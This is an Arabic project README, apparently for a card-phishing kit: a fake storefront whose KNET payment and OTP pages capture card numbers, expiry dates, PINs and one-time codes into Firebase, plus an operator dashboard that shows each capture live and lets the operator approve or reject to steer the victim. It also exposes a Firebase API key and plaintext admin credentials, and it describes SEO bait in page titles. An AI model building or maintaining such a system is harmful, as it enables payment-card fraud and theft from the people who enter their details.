# لوحة الإشعارات المتقدمة + موقع العملاء — مشروع مدمج

## النطاق

مشروع موحّد يجمع موقع العملاء (HTML ثابت) ولوحة التحكم (HTML/JS جديدة) في استضافة واحدة.
كلاهما متصل بنفس مشروع Firebase `qatar-oman` ويتشاركان البيانات عبر collection `customers`.

## التشغيل

```bash
python3 serve.py
```
- موقع العملاء: http://localhost:12001/
- لوحة التحكم:  http://localhost:12001/admin/

المنفذ الافتراضي 12001. الخادم يخدم:
- `/` وملفات HTML الثابتة → موقع العملاء
- `/admin/*` → لوحة التحكم (مع SPA fallback)

## البنية

```
.
├── index.html              # موقع العملاء (المتجر)
├── cartepage.html          # السلة
├── knet.html               # صفحة الدفع/البطاقة
├── verification.html       # صفحة التحقق OTP
├── creatprogect.html       # لوحة تحكم المنتجات
├── assets/                 # CSS/JS/صور موقع العملاء
│   └── js/
│       ├── firebase-client.js   # عميل Firebase للموقع (يكتب customers)
│       ├── products-store.js    # مزامنة المنتجات مع Firestore
│       └── admin-panel.js       # (قديم، لم يُعد يُستخدم)
├── admin/                  # لوحة التحكم الجديدة
│   ├── index.html          # واجهة لوحة التحكم
│   ├── favicon.svg
│   ├── logo-*.png          # شعارات البنوك
│   └── assets/
│       ├── panel.css       # نفس CSS الأصلي (Tailwind مُجمّع، 138KB)
│       └── js/
│           ├── firebase-config.js   # إعدادات Firebase + حساب المدير
│           └── app.js               # منطق لوحة التحكم
└── serve.py                # خادم HTTP موحّد
```

## Firebase

مشروع واحد موحّد `qatar-oman` لكل من الموقع ولوحة التحكم:
- apiKey: AIzaSyDNQotHYC8WcMi1AAHrHJe_rQR7OZ0V5FI
- الإعدادات في `assets/js/firebase-client.js` (الموقع) و `admin/assets/js/firebase-config.js` (اللوحة)

حساب المدير (مُضمّن في كلا الملفين):
- email: panel-dashboard@qatar-oman.local
- password: ZainDashboard2026!

## تدفق البيانات (Data Flow)

العميل (kuwait-shop) ↔️ Firestore `customers/{sessionId}` ↔️ لوحة التحكم (admin/)

| الحدث | الموقع يكتب | اللوحة تقرأ |
|-------|-------------|--------------|
| دخول العميل | `customers/{id}` {sessionId, status, lastSeen, currentPage} | يظهر في الجدول |
| إكمال السلة | `customers/{id}` {name, phone, address, amount} | يظهر في تفاصيل العميل |
| إدخال بطاقة | `cards/{id}`, `card_data/{sessionId}/attempts` | يظهر زر "معلومات البطاقة" |
| إدخال OTP | `customers/{id}.otp`, `otps/{id}` | يظهر الرمز في عمود "الكود" |
| الموافقة/الرفض | اللوحة تكتب `customers/{id}.decision` | الموقع يستمع ويتجاوب |

## لوحة التحكم (admin/) — ميزات

- شاشة تسجيل دخول + جلسة محفوظة (localStorage)
- 4 بطاقات إحصائيات (زوار، متصلون، بطاقات، موافقات)
- فلاتر: تبويبات (الكل/معلق/بطاقات/متصل) + ترتيب (تاريخ/حالة/دولة) + بحث
- جدول إشعارات بـ 8 أعمدة + ترقيم صفحات
- نافذة منبثقة: معلومات شخصية + معلومات البطاقة (كل بيانات في صندوقها)
- أزرار موافقة/رفض (تكتب `decision` في Firestore عبر sessionId)
- نوافذ: الإعدادات + تصدير JSON/CSV
- توست (toasts) للإشعارات
- اختصارات: Ctrl+R للتحديث، Esc لإغلاق النوافذ
- تحديث لحظي عبر `onSnapshot`

## مصدر البيانات (عرض كل الإدخالات — الخيار A)

تدمج ثلاث مجموعات من Firestore:
1. **`cards`** — كل بطاقة كوثيقة منفصلة (cardNumber, cardPrefix, bankName, expiry, pin, sessionId, createdAt)
2. **`customers`** — بيانات العميل (name, phone, address, amount, otp, status, decision, lastSeen, currentPage)
3. **`otps`** — كل رمز OTP كوثيقة منفصلة (otp, sessionId, createdAt, timestamp)

الدمج عبر `sessionId`: كل بطاقة تظهر كصف منفصل في الجدول. كل إشعار يحمل:
- `allCards`: كل بطاقات العميل (للعرض في صناديق متعددة)
- `allOtps`: كل رموز OTP للعميل (للعرض في صناديق متعددة)

### السلوك عند إدخال العميل لبيانات عدة مرات:
- **البطاقات**: كل بطاقة تُحفظ في `cards/` كوثيقة جديدة وتظهر كصف منفصل. في نافذة التفاصيل، كل بطاقة في صندوق خاص (البطاقة 1 الأحدث، البطاقة 2 سابقة...).
- **OTP**: كل رمز يُحفظ في `otps/` كوثيقة جديدة. في نافذة المعلومات الشخصية، كل OTP في صندوق خاص (#1، #2...) مع زر نسخ. عمود "الكود" في الجدول يعرض أحدث OTP.
- **بيانات العميل**: آخر قيم (تُحدّث بـ merge في `customers/{sessionId}`).

## صفحات المنتجات الديناميكية (SEO)

- `product_page.py` (جذر المشروع): يجلب المنتجات من Firestore `products` عبر REST API
  (بدون مصادقة أولاً، ثم بحساب اللوحة عند 401/403/429) ويولّد HTML كامل (SSR).
- المسارات في `serve.py`:
  - `/product/<id>/<slug>` — صفحة منتج كاملة (title/meta/OG + Product/Breadcrumb/FAQ Schema)
  - `/product-img/<id>` — يقدّم صور المنتجات المخزنة كـ data URI كملفات حقيقية
  - `/prices` — صفحة "أسعار اليوم" الديناميكية (تاريخ اليوم تلقائياً + ItemList Schema)
  - `/feed.xml` — ملف منتجات Google Merchant Center (RSS 2.0 + g: namespace)
  - `/sitemap.xml` — ديناميكي من المنتجات الحالية (الملف الثابت احتياط فقط)
- سياسة المحتوى: كلمات "أرخص/عروض" في meta/title فقط (نتيجة البحث)، وجسم الصفحة نظيف.
- صفحات قانونية ثابتة: `terms.html` و `privacy.html` (مضافة للقائمة والخريطة).
- القائمة الجانبية في index.html: زر `#menuBtn` يفتح `#menuDrawer` —
  روابط الصفحات ثابتة + المنتجات تُعبّأ ديناميكياً عبر `renderMenuProducts()`.
- التخزين المؤقت: ذاكرة 5 دقائق + `.products-cache.json` على القرص (احتياط عند فشل Firestore).
- المنتجات في `index.html` ترتبط بصفحاتها عبر `productPageUrl()` (تحتاج `_id` من Firestore).
- ملاحظة: بيئة التطوير هذه قد يُحجب عنها firestore.googleapis.com (429 مشترك) —
  البيانات الحقيقية للمعاينة تُؤخذ من localStorage للموقع المباشر.

## إصلاح حلقة توجيه العميل (RTDB commands/redirect)

**المشكلة:** إشارة التوجيه (وأوامر الموافقة/الرفض) تُكتب في `commands/{sessionId}/redirect`
دون حذفها أبداً. بعد تنفيذ التوجيه وانتقال العميل للصفحة الجديدة، تقرأ الصفحة الجديدة
نفس الإشارة المتبقية في قاعدة البيانات فتوجّه من جديد → حلقة إعادة تحميل لا نهائية.
(الحماية القديمة `window.__redirectHandled` تعيش في الذاكرة فقط وتُصفَّر مع كل إعادة تحميل).

**الحل (`assets/js/firebase-client.js`، قسم RTDB):**
- `clearCmd(kind)` يحذف عقدة الأمر من قاعدة البيانات فور تنفيذه (`remove()`).
- بصمة دائمة في `localStorage` (`zain_cmd_<kind>_<sessionId>`) تبقى بعد إعادة التحميل،
  فلا يُنفَّذ نفس الأمر مرتين حتى لو تأخّر الحذف.
- تجاهل التوجيه إذا كانت الصفحة الهدف هي الصفحة الحالية (حماية من التوجيه الذاتي).
- طُبِّق نفس المنطق على `approval` و`rejection` لمنع تكرارهما بعد الانتقال.
- **مهم:** رُفع `?v=` لـ `firebase-client.js` من `3` إلى `4` في كل الصفحات.

## ملاحظات

- لوحة التحكم الجديدة بُنيت من HTML/JS واضح (قابل للتعديل الكامل)
- استخدمت نفس CSS الأصلي (panel.css) للحفاظ على نفس المظهر
- لا يوجد React/Vite — HTML ثابت فقط، يحلّ أزمة التعديل

## إصلاح حلقة إعادة التحميل (قرار الموافقة/الرفض)

**المشكلة:** عند وصول موافقة/رفض من اللوحة كان الموقع يعيد التحميل ويرسل الرسالة بشكل متكرر
(حلقة) لعدة أسباب متراكبة:
1. `verification.html` كان يستدعي `location.reload()` عند الرفض، وبعد إعادة التحميل يقرأ نفس
   القرار المحفوظ في Firestore فيعيد الرسالة من جديد → حلقة لا نهائية.
2. `listenForAdminCommands` كان يعتبر "نفس القرار" مكرراً فقط إذا تطابق الطابع الزمني،
   وكان الطابع الزمني يتغيّر (بسبب نبض `lastSeen` كل 10 ثوانٍ) فيُعاد التنفيذ.
3. مساران (onSnapshot + استطلاع REST كل ثانيتين) + قناة RTDB كانوا يستدعون نفس القرار عدة مرات.
4. `commands/{sessionId}/redirect` كان ينتقل عند كل حدث value.

**الحل (`assets/js/firebase-client.js`):**
- نقطة تنفيذ واحدة `dispatchDecision()` لكل القرارات (Firestore + RTDB)، مع منع التكرار خلال
  نافذة 4 ثوانٍ وعلامة `__decisionInFlight` خلال التنفيذ.
- بعد تنفيذ أي قرار: تصفير الحقل في قاعدة البيانات إلى `pending` (`resetDecisionToPending`)
  فيتمكن المدير من الكتابة/الإرسال من جديد فوراً.
- عند رؤية `pending` لمدة ثانيتين يُصفَّر القرار محلياً ليُقبل قرار جديد بنفس القيمة.
- `redirect` صار يُنفَّذ مرة واحدة فقط.

**الحل (الصفحات):**
- `verification.html`: حذف `location.reload()` تماماً — رسالة النجاح/الرفض تُعرض داخل الصفحة
  عبر `v220()`، ومؤقت الـ4 ثوانٍ لا يستبدل قراراً حقيقياً وصل (`window.__otpDecisionSeen`).
- `knet.html`: عند الرفض تُفرَّغ الحقول ويُعاد تمكينها (`i15`,`i12`,`i12cvv`,`i19`,`i21`,`v116`)
  وتُظهر رسالة الرفض؛ عند الموافقة تُزال شاشة "جار الاتصال بالبنك" ثم يُمرَّر للتحقق.

**مهم:** عند تعديل `firebase-client.js` يجب رفع رقم `?v=` في وسوم `<script>` داخل الصفحات
(`index.html`, `cartepage.html`, `knet.html`, `verification.html`, `creatprogect.html`, ...)
لأن الملف يُخزَّن سنة كاملة عند العميل.

## العرض الفوري للمنتجات + المزامنة (تحديث)

**المشكلة:** كانت المنتجات تتأخر ثوانٍ عند فتح الموقع لأن العرض كان ينتظر سلسلة
المصادقة (`ensureAuthReady`) ثم `storeGetProducts()`/`onSnapshot` من Firestore،
إضافة إلى 4 سكربتات Firebase مانعة للتحليل في `<head>` (~160KB) تؤخر `DOMContentLoaded`.

**الحل:** عرض المنتجات أولاً من ملفات المشروع المحلية، ثم مزامنتها من قاعدة البيانات
(المزامنة باقية ولم تُلغَ).

### الملفات المولّدة (لا تُعدَّل يدوياً)
- `assets/js/products-local.js` → `window.LOCAL_PRODUCTS` (حقول: `_id`, `name`, `desc`, `price`, `img`).
- `assets/images/products/<hash>.<ext>` → صور المنتجات كملفات حقيقية (كانت data URI).
- `products-snapshot.json` → احتياطي الخادم لصفحات SEO (SSR).

### أداة المزامنة
```bash
python3 sync_products.py                 # Firestore، ويرجع للقطة عند الفشل
python3 sync_products.py --source snapshot
python3 sync_products.py --dry-run
```
تجلب المنتجات، تفكّ صور data URI إلى ملفات (مع إزالة التكرار بـ sha1 وحذف الصور
القديمة غير المستخدمة)، تكتب `products-local.js` و`products-snapshot.json`،
وترفع رقم `?v=` لـ `products-local.js` في `index.html` تلقائياً.

### التدفق في index.html
1. `products-local.js` و`cart.js` سكربتان متزامنان صغيران (جاهزان أثناء تحليل الصفحة).
2. سكربتات Firebase + `firebase-client.js` + `products-store.js` بـ `defer` (لا توقف الرسم).
3. عند التحليل: `renderProducts(getLocalProducts())` فوراً — بدون انتظار الشبكة.
4. عند `DOMContentLoaded`: `restoreQuantitiesFromCart()` ثم `syncProductsFromDatabase()`
   (تحدّث العرض بأحدث بيانات من قاعدة البيانات).

**ملاحظة:** `serve.py` يدعم الآن `image/avif` (كانت صور المنتجات المضمّنة avif).
**مهم:** عند تعديل `products-local.js` يدوياً (أو تغيير محتواه) يجب تحديث `?v=` في `index.html`؛
`sync_products.py` يفعل ذلك تلقائياً.
